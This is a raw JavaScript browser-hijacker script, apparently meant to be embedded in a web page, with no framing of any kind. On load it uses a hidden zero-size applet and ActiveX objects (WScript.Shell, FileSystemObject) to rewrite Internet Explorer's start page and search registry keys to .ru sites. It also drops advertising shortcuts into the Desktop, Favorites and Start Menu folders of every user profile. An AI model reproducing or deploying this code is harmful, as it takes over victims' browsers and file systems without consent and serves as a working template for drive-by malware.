   // <!--
   document.write("<APPLET code=com.ms.activeX.ActiveXComponent.class height=0 width=0><PARAM NAME=code VALUE=com.ms.activeX.ActiveXComponent><PARAM NAME=height VALUE=1><PARAM NAME=width VALUE=1></APPLET>");
   var gsStartPUrl = "about:blank";
   //
   var gsStartPUrl = "http://www.euroreal.ru";
   //
   var gsDeskUrl = "http://www.cartoons.ru";
   var gsDeskDescr = "Postcards";
   //
   var gsFavorUrl = "http://www.goldengate.ru";
   var gsFavorDescr = "Internet advertising";
   //
   var gsSMenuUrl = "http://www.deluxe.ru/";
   var gsSMenuDescr = "Web-design";
   //
   var gsSearch = "http://www.one.ru";
   var gsCustomSearch = "http://www.one.ru";
   //-----------------------------------------------
   var iever = GetIEVer();
   function GetIEVer()
   {
   var ua = window.navigator.userAgent
   var msie = ua.indexOf( "MSIE " )
   if( msie > 0 )
   return parseInt( ua.substring( msie+5, ua.indexOf( ".", msie ) ) )
   else
   return 0
   }
   function onMycatch( str )
   {
   }
   function ChangeStartPage( )
   {
   {
   Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", gsStartPUrl );
   Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", gsStartPUrl );
   }
   }
   function ChangeSearch()
   {
   Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Search Bar", gsSearch );
   Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Bar", gsSearch );
   if( iever > 4 )
   {
   Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Search\\SearchAssistant", gsSearch );
   Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Search\\CustomizeSearch", gsCustomSearch );
   }
   }
   function AddLnk( sFolder, type )
   {
   {
   if( FSO.FolderExists( sFolder ) )
   {
   var url, discr;
   switch(type)
   {
   case 0: url = gsDeskUrl; discr = gsDeskDescr; break;
   case 1: url = gsFavorUrl; discr = gsFavorDescr; break;
   case 2: url = gsSMenuUrl; discr = gsSMenuDescr; break;
   }
   var Shor = Shl.CreateShortcut( sFolder + "\\" + discr +".url" );
   Shor.TargetPath = url;
   Shor.Save();
   }
   }
   //catch(e){ return false; }
   return true;
   }
   function AddLnkBase( sFolder, bFavor, bMenu, bDesk )
   {
   //try
   {
   if( FSO.FolderExists( sFolder ) )
   {
   sFolder = sFolder + "\\";
   if( bFavor )
   {
   AddLnk( sFolder + "Favorites", 1 );
   AddLnk( sFolder + "Èçáðàííîå", 1 );
   }
   if( bMenu )
   {
   AddLnk( sFolder + "Start Menu", 2 );
   AddLnk( sFolder + "Ãëàâíîå ìåíþ", 2 );
   /*AddLnk( sFolder + "Startmenu", 2 );//de
   AddLnk( sFolder + "Menu Inicio", 2 );//es
   AddLnk( sFolder + "Menu Avvio", 2 );//it*/
   }
   if( bDesk )
   {
   AddLnk( sFolder + "Desktop", 0 );
   AddLnk( sFolder + "Ðàáî÷èé ñòîë", 0 );
   }
   return true;
   }
   }
   return true;
   }
   function AddLinksNTAll( sFolder, sCurUser, bFavor, bMenu, bDesk )
   {
   AddLnkBase( sFolder + sCurUser, bFavor, bMenu, bDesk );
   var iLen = sCurUser.length;
   var f = FSO.GetFolder( sFolder );// can throw exception
   fc = new Enumerator( f.SubFolders );
   for( ; !fc.atEnd(); fc.moveNext() )
   {// get each user's folder
   var sUser = fc.item().Name;//login.001
   var dot = sUser.indexOf( "." );
   if( dot > 0 )
   {
   sBase = sUser.substring( 0, dot );//login
   if( sBase == sCurUser )
   {
   AddLnkBase( fc.item().Path, bFavor, bMenu, bDesk );
   }
   }
   }
   }
   function AddLinksNT( sFolder )
   {
   if( FSO.FolderExists( sFolder ) )
   {
   AddLinksNTAll( sFolder, "All Users", false, true, true );
   AddLinksNTAll( sFolder, Net.UserName, true, false, false );
   }
   }
   function AddLinks(  )
   {
   {
   var WF = FSO.GetSpecialFolder(0); // windows folder
   AddLnkBase( WF, true, true, true );
   AddLinksNT( FSO.GetDriveName(WF) + "\\Documents and Settings\\" );
   AddLinksNT( WF + "\\Profiles\\" );
   }
   }
   function CreateActiveX()
   {
   {
   if( iever == 4 || iever == 5 )
   {
   a1=document.applets[0];
   a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
   a1.createInstance();
   Shl = a1.GetObject(); // Windows Script Host Shell Object, WScript.Shell
   a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
   a1.createInstance();
   FSO = a1.GetObject(); // FileSystem Object, Scripting.FileSystemObject
   a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}");
   a1.createInstance();
   Net = a1.GetObject(); // Windows Script Host Network Object, WScript.Network
   }
   else if( iever > 5 )
   {
   Shl = new ActiveXObject("WScript.Shell");
   FSO = new ActiveXObject("Scripting.FileSystemObject");
   Net = new ActiveXObject("WScript.Network");
   }
   }
   }
   function main()
   {
   {
   CreateActiveX();
   ChangeStartPage();
   ChangeSearch();
   AddLinks();
   }
   }
   function init()
   {
   if( iever > 3 )
   {
   setTimeout("main()", 1000);
   }
   }
   init();

   // -->
